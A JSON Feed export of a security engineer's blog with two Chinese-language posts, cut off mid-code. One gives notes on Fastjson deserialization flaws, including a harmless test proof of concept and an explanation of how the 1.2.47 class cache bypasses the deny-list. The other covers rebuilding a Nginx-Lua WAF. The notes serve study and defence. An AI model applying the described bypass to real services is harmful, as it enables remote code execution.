{
    "version": "https://jsonfeed.org/version/1",
    "title": "chriskali",
    "home_page_url": "https://chriskalix.github.io/",
    "feed_url": "https://chriskalix.github.io/feed.json",
    "description": "Security engineer.<br> Working on eBPF, Host Intrusion Detection System, WAF, and some Java Security.<br> Language: golang",
    "icon": "https://chriskalix.github.io/apple-touch-icon.png",
    "favicon": "https://chriskalix.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "chriskali",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://chriskalix.github.io/2022/09/13/java-security",
            "title": "Java 安全小计",
            "summary": "Java 安全小计",
            "content_text": "写在前面之前写过一篇 Java 安全学习笔记，记的比较乱，原先的文字版也由于没有维护找不到了，遂重新记录一下，有很老的漏洞，也有稍微新一点的，结合实际工作中碰到的一些问题，作为学习记录漏洞记录Fastjson  Fastjson 是 Java 很著名的一个漏洞系列，但是时间一长很容易忘记，重新记录作为备忘。这回记录的尽量简单明了一点1.2.24Fastjson 漏洞首次出现，也是最经典的 @type 字段首次出现，简单的 POC 如下import com.alibaba.fastjson.JSON;public class Fastjson_1_2_24 {    public static class Test {        private String id;        Test() {            System.out.println(\"I am the test\");        }        public void setId(String ids){            System.out.println(\"setId go\");            this.id=ids;        }        public String getId(){            System.out.println(\"GetId go\");            return this.id;        }    }    public static void main(String[] args) {        JSON.parseObject(\"{\\\"@type\\\":\\\"fastjson.Fastjson_1_2_24$Test\\\",\\\"id\\\":\\\"123\\\"}\");    }}断点打在类初始化，能看到调用堆栈，记录一些关键点首先json是从左向右解析，LBRACE 就是 {case LBRACE:    JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));    return parseObject(object, fieldName);之后进入长长的 parseObject，parseObject 可以简单的看为循环的对每一个字段做解析，例如片段，对 key/value 做处理，特殊点就在于// JSON.DEFAULT_TYPE_KEY = @typeif (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {    String typeName = lexer.scanSymbol(symbolTable, '\"');    // mark    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());    if (clazz == null) {        object.put(JSON.DEFAULT_TYPE_KEY, typeName);        continue;    }    lexer.nextToken(JSONToken.COMMA);    if (lexer.token() == JSONToken.RBRACE) {        lexer.nextToken(JSONToken.COMMA);        try {            Object instance = null;            ObjectDeserializer deserializer = this.config.getDeserializer(clazz);            if (deserializer instanceof JavaBeanDeserializer) {                instance = ((JavaBeanDeserializer) deserializer).createInstance(this, clazz);            }            if (instance == null) {                if (clazz == Cloneable.class) {                    instance = new HashMap();                } else if (\"java.util.Collections$EmptyMap\".equals(typeName)) {                    instance = Collections.emptyMap();                } else {                    instance = clazz.newInstance();                }            }            return instance;        } catch (Exception e) {            throw new JSONException(\"create instance error\", e);        }    }    ...    ObjectDeserializer deserializer = config.getDeserializer(clazz);    return deserializer.deserialze(this, clazz, fieldName);}一个分界点就是在 loadClass 这个部分，后续会在类加载这部分做文章，后续利用和类加载先不在这儿讨论（RMI/LDAP…）1.2.47后续，出现了对这种任意类加载的检查机制，同样在类加载的时候，多了一个 checkAutoTypeif (object != null        &amp;&amp; object.getClass().getName().equals(typeName)) {    clazz = object.getClass();} else {    clazz = config.checkAutoType(typeName, null, lexer.getFeatures());}// 引入了对应的黑名单机制，顺便还给加了一下密if (clazz == null) {    clazz = TypeUtils.getClassFromMapping(typeName);//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null}// 这里给入 java.lang.classif (clazz == null) {    clazz = deserializers.findClass(typeName);// 将typeName作为key从deserializers(IdentityHashMap)中查找对象}if (clazz != null) {    if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) {        throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());    }    return clazz;}if (!autoTypeSupport) {//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) {        char c = className.charAt(i);        hash ^= c;        hash *= PRIME;        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {            throw new JSONException(\"autoType is not support. \" + typeName);        }        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {            if (clazz == null) {                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);            }            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {                throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());            }            return clazz;        }    }}if (clazz == null) {    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);}//省略部分代码return clazz;其实跟之前不一样，需要有两个键值对的方式，就是因为要使用 mapping 缓存机制，在第一次循环的时候把恶意这个类给加载到缓存，在第二次运行到 getClassFromMapping 的时候，就直接返回了，绕过了下面的黑名单检查（虽然黑名单检查本身就不对…）",
            "content_html": "<h2 id=\"写在前面\">写在前面</h2><p>之前写过一篇 Java <a href=\"https://chriskaliX.github.io/assets/imgs/java_security_old.pdf\">安全学习笔记</a>，记的比较乱，原先的文字版也由于没有维护找不到了，遂重新记录一下，有很老的漏洞，也有稍微新一点的，结合实际工作中碰到的一些问题，作为学习记录</p><h2 id=\"漏洞记录\">漏洞记录</h2><h3 id=\"fastjson\">Fastjson</h3><blockquote>  <p>Fastjson 是 Java 很著名的一个漏洞系列，但是时间一长很容易忘记，重新记录作为备忘。这回记录的尽量简单明了一点</p></blockquote><h4 id=\"1224\">1.2.24</h4><p>Fastjson 漏洞首次出现，也是最经典的 <code class=\"language-plaintext highlighter-rouge\">@type</code> 字段首次出现，简单的 POC 如下</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">com.alibaba.fastjson.JSON</span><span class=\"o\">;</span><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Fastjson_1_2_24</span> <span class=\"o\">{</span>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Test</span> <span class=\"o\">{</span>        <span class=\"kd\">private</span> <span class=\"nc\">String</span> <span class=\"n\">id</span><span class=\"o\">;</span>        <span class=\"nc\">Test</span><span class=\"o\">()</span> <span class=\"o\">{</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"I am the test\"</span><span class=\"o\">);</span>        <span class=\"o\">}</span>        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">setId</span><span class=\"o\">(</span><span class=\"nc\">String</span> <span class=\"n\">ids</span><span class=\"o\">){</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"setId go\"</span><span class=\"o\">);</span>            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">=</span><span class=\"n\">ids</span><span class=\"o\">;</span>        <span class=\"o\">}</span>        <span class=\"kd\">public</span> <span class=\"nc\">String</span> <span class=\"nf\">getId</span><span class=\"o\">(){</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"GetId go\"</span><span class=\"o\">);</span>            <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">;</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"nc\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">parseObject</span><span class=\"o\">(</span><span class=\"s\">\"{\\\"@type\\\":\\\"fastjson.Fastjson_1_2_24$Test\\\",\\\"id\\\":\\\"123\\\"}\"</span><span class=\"o\">);</span>    <span class=\"o\">}</span><span class=\"o\">}</span></code></pre></div></div><p>断点打在类初始化，能看到调用堆栈，记录一些关键点</p><p>首先json是从左向右解析，LBRACE 就是 <code class=\"language-plaintext highlighter-rouge\">{</code></p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">case</span> <span class=\"nl\">LBRACE:</span>    <span class=\"nc\">JSONObject</span> <span class=\"n\">object</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">JSONObject</span><span class=\"o\">(</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">isEnabled</span><span class=\"o\">(</span><span class=\"nc\">Feature</span><span class=\"o\">.</span><span class=\"na\">OrderedField</span><span class=\"o\">));</span>    <span class=\"k\">return</span> <span class=\"nf\">parseObject</span><span class=\"o\">(</span><span class=\"n\">object</span><span class=\"o\">,</span> <span class=\"n\">fieldName</span><span class=\"o\">);</span></code></pre></div></div><p>之后进入长长的 <code class=\"language-plaintext highlighter-rouge\">parseObject</code>，<code class=\"language-plaintext highlighter-rouge\">parseObject</code> 可以简单的看为循环的对每一个字段做解析，例如片段，对 key/value 做处理，特殊点就在于</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// JSON.DEFAULT_TYPE_KEY = @type</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span> <span class=\"o\">==</span> <span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">DEFAULT_TYPE_KEY</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">isEnabled</span><span class=\"o\">(</span><span class=\"nc\">Feature</span><span class=\"o\">.</span><span class=\"na\">DisableSpecialKeyDetect</span><span class=\"o\">))</span> <span class=\"o\">{</span>    <span class=\"nc\">String</span> <span class=\"n\">typeName</span> <span class=\"o\">=</span> <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">scanSymbol</span><span class=\"o\">(</span><span class=\"n\">symbolTable</span><span class=\"o\">,</span> <span class=\"sc\">'\"'</span><span class=\"o\">);</span>    <span class=\"c1\">// mark</span>    <span class=\"nc\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">getDefaultClassLoader</span><span class=\"o\">());</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">DEFAULT_TYPE_KEY</span><span class=\"o\">,</span> <span class=\"n\">typeName</span><span class=\"o\">);</span>        <span class=\"k\">continue</span><span class=\"o\">;</span>    <span class=\"o\">}</span>    <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">nextToken</span><span class=\"o\">(</span><span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">COMMA</span><span class=\"o\">);</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">token</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">RBRACE</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">nextToken</span><span class=\"o\">(</span><span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">COMMA</span><span class=\"o\">);</span>        <span class=\"k\">try</span> <span class=\"o\">{</span>            <span class=\"nc\">Object</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>            <span class=\"nc\">ObjectDeserializer</span> <span class=\"n\">deserializer</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">config</span><span class=\"o\">.</span><span class=\"na\">getDeserializer</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">);</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">deserializer</span> <span class=\"k\">instanceof</span> <span class=\"nc\">JavaBeanDeserializer</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"o\">((</span><span class=\"nc\">JavaBeanDeserializer</span><span class=\"o\">)</span> <span class=\"n\">deserializer</span><span class=\"o\">).</span><span class=\"na\">createInstance</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">clazz</span><span class=\"o\">);</span>            <span class=\"o\">}</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">instance</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"nc\">Cloneable</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">)</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">HashMap</span><span class=\"o\">();</span>                <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"s\">\"java.util.Collections$EmptyMap\"</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">))</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"nc\">Collections</span><span class=\"o\">.</span><span class=\"na\">emptyMap</span><span class=\"o\">();</span>                <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"n\">clazz</span><span class=\"o\">.</span><span class=\"na\">newInstance</span><span class=\"o\">();</span>                <span class=\"o\">}</span>            <span class=\"o\">}</span>            <span class=\"k\">return</span> <span class=\"n\">instance</span><span class=\"o\">;</span>        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"nc\">Exception</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"create instance error\"</span><span class=\"o\">,</span> <span class=\"n\">e</span><span class=\"o\">);</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span>    <span class=\"o\">...</span>    <span class=\"nc\">ObjectDeserializer</span> <span class=\"n\">deserializer</span> <span class=\"o\">=</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">getDeserializer</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">);</span>    <span class=\"k\">return</span> <span class=\"n\">deserializer</span><span class=\"o\">.</span><span class=\"na\">deserialze</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">clazz</span><span class=\"o\">,</span> <span class=\"n\">fieldName</span><span class=\"o\">);</span><span class=\"o\">}</span></code></pre></div></div><p>一个分界点就是在 loadClass 这个部分，后续会在类加载这部分做文章，后续利用和类加载先不在这儿讨论（RMI/LDAP…）</p><h4 id=\"1247\">1.2.47</h4><p>后续，出现了对这种任意类加载的检查机制，同样在类加载的时候，多了一个 checkAutoType</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">object</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span>        <span class=\"o\">&amp;&amp;</span> <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">().</span><span class=\"na\">getName</span><span class=\"o\">().</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">))</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">();</span><span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">checkAutoType</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">getFeatures</span><span class=\"o\">());</span><span class=\"o\">}</span><span class=\"c1\">// 引入了对应的黑名单机制，顺便还给加了一下密</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">getClassFromMapping</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">);</span><span class=\"c1\">//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null</span><span class=\"o\">}</span><span class=\"c1\">// 这里给入 java.lang.class</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"n\">deserializers</span><span class=\"o\">.</span><span class=\"na\">findClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">);</span><span class=\"c1\">// 将typeName作为key从deserializers(IdentityHashMap)中查找对象</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">expectClass</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span>            <span class=\"o\">&amp;&amp;</span> <span class=\"n\">clazz</span> <span class=\"o\">!=</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">HashMap</span><span class=\"o\">.</span><span class=\"na\">class</span>            <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">isAssignableFrom</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">))</span> <span class=\"o\">{</span>        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"type not match. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span> <span class=\"o\">+</span> <span class=\"s\">\" -&gt; \"</span> <span class=\"o\">+</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>    <span class=\"o\">}</span>    <span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"n\">autoTypeSupport</span><span class=\"o\">)</span> <span class=\"o\">{</span><span class=\"c1\">//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤</span>    <span class=\"kt\">long</span> <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">h3</span><span class=\"o\">;</span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">3</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">className</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"o\">++</span><span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">className</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>        <span class=\"n\">hash</span> <span class=\"o\">^=</span> <span class=\"n\">c</span><span class=\"o\">;</span>        <span class=\"n\">hash</span> <span class=\"o\">*=</span> <span class=\"no\">PRIME</span><span class=\"o\">;</span>        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"nc\">Arrays</span><span class=\"o\">.</span><span class=\"na\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">denyHashCodes</span><span class=\"o\">,</span> <span class=\"n\">hash</span><span class=\"o\">)</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"autoType is not support. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span><span class=\"o\">);</span>        <span class=\"o\">}</span>        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"nc\">Arrays</span><span class=\"o\">.</span><span class=\"na\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">acceptHashCodes</span><span class=\"o\">,</span> <span class=\"n\">hash</span><span class=\"o\">)</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">defaultClassLoader</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span>            <span class=\"o\">}</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">expectClass</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">isAssignableFrom</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">))</span> <span class=\"o\">{</span>                <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"type not match. \"</span> <span class=\"o\">+</span> <span class=\"n\">typeName</span> <span class=\"o\">+</span> <span class=\"s\">\" -&gt; \"</span> <span class=\"o\">+</span> <span class=\"n\">expectClass</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>            <span class=\"o\">}</span>            <span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span><span class=\"o\">}</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>    <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">defaultClassLoader</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">);</span><span class=\"o\">}</span><span class=\"c1\">//省略部分代码</span><span class=\"k\">return</span> <span class=\"n\">clazz</span><span class=\"o\">;</span></code></pre></div></div><p>其实跟之前不一样，需要有两个键值对的方式，就是因为要使用 mapping 缓存机制，在第一次循环的时候把恶意这个类给加载到缓存，在第二次运行到 <code class=\"language-plaintext highlighter-rouge\">getClassFromMapping</code> 的时候，就直接返回了，绕过了下面的黑名单检查（虽然黑名单检查本身就不对…）</p>",
            "url": "https://chriskalix.github.io/2022/09/13/java-security",
            
            
            
            
            
            "date_published": "2022-09-13T00:00:00+02:00",
            "date_modified": "2022-09-13T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/08/21/waf-dev",
            "title": "WAF 开发实战",
            "summary": "WAF 开发实战",
            "content_text": "背景爬虫越来越多，峰值流量越来越高，非标应用难以维护等，对于 WAF 产生了挑战。通过 WAF 重构，减轻历史负担，承担更多安全场景需求  性能上提升  能够更好地处理大流量场景  更加合理标准化的架构方案  函数级别的灰度控制能力设计本身谈不上大的改动或者设计，因为 WAF 升级过程中需要同时兼容两个版本，没有做很大变更，大致如下。原先 WAF 大致如下实际遇到的问题Redis  Redis 负责规则/开关的存储，由 WAF-admin 控制同步Nginx-Lua 部分需要和 Redis/WAF-admin 通讯（storm 为 filebeat 同步计算）。而问题则是 Redis 因为历史原因通过 IP 连接单库，虽然有从库，仍然有风险造成类似单点故障的问题。Storm  Storm 为计频，满足实时计算的封禁需求为组内早先自己搭建，完全由自己维护。目前公司内部不再使用 storm 集群，即自维护的集群如果出现了主节点 down 等问题，一时间也无法完全恢复，同样容易造成单点故障问题WAF-admin  WAF-admin 是主控端，负责 Nginx-Lua 控制，数据对接处理等完全由 Python 编写，代码中有许多 Hardcode 的地方，无法 CI/CD 走标准发布。在特殊情况没法及时扩容等Others一些分布在机器上的定时任务，脚本，用于 WAF 的分析等，没有良好的备份/标准文档等改动  图中的 Redis 被移除，WAF-admin 重构为 Java（标准化，可以 CI/CD），Mysql 不再自己维护，Storm 全部重写为 Flink 并且满足新的需求具体细节  WAF 开发的具体笔记，仅记录重要部分Nginx-Lua  公司的 WAF 直接以 Lua 的形式部署在 LB 之后的 Nginx 集群。通过伪代码的形式展示存在的问题和修复错误的函数使用入职接手之后，碰到过一个线上的问题。有一个接口，单独使用 ip + url 的形式无法封禁。经过排查，是一个很小的点。在 Nginx 中，某个 Server 配置如下server {    ...    server_name xxx.test.com xxx1.test.com;    ...}而当时封禁函数使用的地址获取方式为ngx.var.server_name .. ngx.var.uri其中 ngx.var.server_name 默认获取 server_name 的第一个，早在 2015 年就有人提过这个问题。ngx.var.server_name 本身使用目的不是如此，而应该使用内置的 ngx.var.host 来获取重复的字符操作  在老版本的 Lua 中，经常能看到一些字符串的重复操作。常见的是：从 nginx 共享内存中读取规则，并且解析。伪代码如下function demo_check()    local config = rules:get(\"demo\")    for _, d in pairs(split(config), \"!!!\") do    ...这样的代码几乎出现在每个函数中，穿插在对应的 access 流程里。假设我们有 10 个 check 函数，那么每次请求我们都需要做 10 次无效的字符串 split 操作。在后续的对比里，这段 split 所占的大约为 15 ～ 20%如何解决这个问题? 很尴尬的是，这个 WAF 代码原先并无引入 worker，没有缓存的功能。大致为，在 nginx 的 init_worker 阶段引入 worker 文件，做秒级的规则 pull 和解析。代码也很简单，写好函数，定时调用即可Segfault  当我开心的写完，引入这个文件之后，我们发现在一些测试机器上会出现 segment fault 的问题，我们 dump 下这个文件，稍微看了一下。gdb &lt;nginx&gt; core&gt; (gdb) bt`text`#0 ... in ngx_http_core_create_srv_conf()#1 ... in ngx_http_lua_init_worker()#2 ... in ngx_worker_process_init()...大致可以看出跟我们引入的 init_worker 文件相关，函数定位在 ngx_http_core_create_srv_conf。通过查询，我们看到有一个类似 issue。大致原因为：当 nginx 版本 &gt;= 1.15.0 且 lua-nginx-module 组件 &lt;= 0.10.14 时会出现这个问题。这种往往是在后期测试时发现，能搜到的只有官方的特殊 issue。同时对于 WAF 这种影响面很大的，上线发布等要有合理的测试、灰度等发现这类比较隐蔽的问题多次字符拼接在原先 Log 日志打印部分，能看到类似以下代码local log = clientip .. \" [\" .. time .. \" ]\" .. method .. \" \" .. ngx_method .. \" \" ......有类似超 9 个字符串连续拼接的场景。在 Lua 中每次 .. 拼接意味着开辟新空间，产生拷贝。这种多次拼接的长字符串拼接，对性能会有较大的影响，会有频繁 GC 的风险。在新 WAF 中改为通过 table concat 的方式做拼接。concat 函数本身不会有频繁申请拷贝的操作，而是当写满一个定长的 BUFFER 之后，才会生成一个 TString 做一次内存合并。在其他的一些简单场景，如单次使用 .. 进行拼接，则无需做修改。多维度限流  之前的限流完全依赖两个，一个是实时处理（Storm 根据日志计频），但是往往会有小的延时（例如 10 秒）；另一个就是单机器上的 URL 限流（兜底）。我们需要一个更为灵活的多维度限流调研之后，我们需要一种支持任意 Header 字段，Cookie 字段的限流，来满足一些活动场景下，大流量代拍、恶意刷取的场景。限流部分可以使用 lua-resty-limit-traffic，这种使用类似于匀速器，即如果设定 1 秒内限定 rate 100，则任意的 0.1 秒都是均匀的。由于引入组件还需要做稳定性测试，延长了整个项目的周期，所以决定直接用共享内存实现伪代码如下:function advanced_cc_check(context)    ...    if advanced_cc_check == \"on\" then        cache:flush_expired()        local rule = get_rule(\"advanced_cc\" .. context.uri)        for field, value in pairs(rule) do            if field == \"ip\" then                local key = \"advanced_cc\" .. context.uriip                local count = cache:get(key)                local counter = 0;                if count then                    counter = cache:incr(key, 1)                else                    cache:set(key, 1, 1)                 